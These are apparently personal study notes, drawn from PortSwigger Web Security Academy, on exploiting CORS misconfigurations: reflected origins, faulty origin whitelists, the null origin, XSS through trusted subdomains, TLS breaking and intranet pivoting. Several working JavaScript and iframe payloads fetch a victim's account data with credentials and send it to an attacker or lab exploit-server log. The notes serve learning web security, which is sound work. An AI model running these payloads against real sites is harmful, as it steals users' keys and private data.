## Server-generated [ACAO](https://portswigger.net/web-security/cors/access-control-allow-origin) header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true
```

Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```

## Errors parsing Origin headers

istakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

An attacker might be able to gain access by registering the domain:

`hackersnormal-website.com`

Alternatively, suppose an application grants access to all domains beginning with

`normal-website.com`

An attacker might be able to gain access using the domain:

`normal-website.com.evil-user.net`

### Null origin value

Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com 
Origin: null
```

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a6100b80467417fc081638600ad007a.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='exploit-0a890027041c41fdc09f621e012b0071.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting ([XSS](https://portswigger.net/web-security/cross-site-scripting)), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

An attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Breaking TLS with poorly configured CORS

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:

1.   The victim user makes any plain HTTP request.
2.   The attacker injects a redirection to:
    `http://trusted-subdomain.vulnerable-website.com`
3.   The victim's browser follows the redirect.
4.   The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
    `https://vulnerable-website.com`
5.   The victim's browser makes the CORS request, including the origin:
    `http://trusted-subdomain.vulnerable-website.com`
6.   The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
7.   The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

Example with XSS and TLS break:
```html
<script>
document.location="http://stock.0a5f00e404759c3dc063d12e00300019.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5f00e404759c3dc063d12e00300019.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a1100ff04a59cfac071d01d01d500c8.exploit-server.net/log?key='%2bthis.responseText; };%3C/script>&storeId=1"
</script>
```

## Intranets and CORS without credentials

Most CORS attacks rely on the presence of the response header:

`Access-Control-Allow-Credentials: true`

Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:

`GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com`

And the server responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: *`

The application server is trusting resource requests from any origin without credentials. If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources

PS: Sorry, I didn't get the lab lol
https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
